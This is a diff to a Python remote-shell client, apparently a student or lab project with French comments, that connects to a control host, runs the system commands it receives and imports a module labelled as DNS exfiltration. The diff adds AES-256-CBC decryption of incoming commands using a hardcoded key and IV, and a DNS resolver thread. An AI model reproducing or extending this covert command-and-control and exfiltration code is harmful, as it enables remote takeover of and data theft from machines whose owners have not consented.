@@ -15,8 +15,10 @@ from dns_client import *   # exfiltration via DNS
 HOST = '192.168.1.6'
 PORT = 25566
 DNS_PORT = 53
-KEY = b'267eAs?594f6C:5m'
-IV = b'a5E8s9!AF272344_'
+# clé de 32 octets pour utiliser AES-256 CBC
+KEY = b'W3c9vlwl1Cj0tM6FHkh3pZ%OTc+x8ET='
+# vecteur initial de 16 octets
+IV = b'efd6cb512023b721'
 # taille des messages : 128kB
 BUFFER_SIZE = 1024 * 128
 
@@ -53,7 +55,8 @@ def shell_interpreter(wrappedSocket):
             received_data = wrappedSocket.recv(BUFFER_SIZE)
             # Send the output of the command over the SSL connection
             # Execute a system command
-            cmd = received_data.decode().split()
+            cmd = decrypt_aes_cbc(KEY, IV, received_data)
+            cmd = cmd.split()
             # la commande a-t-elle des paramètres ?
             if cmd[0] == "cd" and os.path.exists(cmd[1]):
                 os.chdir(cmd[1])
@@ -150,6 +153,13 @@ def shell_interpreter(wrappedSocket):
         exit(0)
 
 if __name__ == "__main__":
+    # OS Windows
+    if os.name == 'nt':
+        windows = os.system('cls')
+
+    # OS UNIX
+    else:
+        unix = os.system('clear')
     thread_dns = threading.Thread(target=shell_interpreter, args=[wrappedSocket])
     thread_dns.start()
     dns_resolver(HOST, DNS_PORT)
